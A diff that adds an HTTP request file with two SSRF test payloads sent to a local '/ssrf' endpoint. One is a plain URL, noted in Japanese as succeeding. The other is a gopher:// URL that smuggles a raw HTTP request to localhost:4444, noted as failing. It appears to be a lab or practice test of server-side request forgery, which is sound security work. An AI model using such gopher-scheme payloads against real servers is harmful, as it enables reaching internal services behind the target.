@@ -1,0 +1,13 @@
+
+### payload 1 刺さる
+POST http://localhost:8888/ssrf HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+url=http://example.com/
+
+
+### payload 2 刺さらない
+POST http://localhost:8888/ssrf HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+url=gopher://localhost:4444/_GET%20/%20HTTP/1.1%0D%0AHost:%20localhost:4444%0D%0A%0D%0A%0D%0A
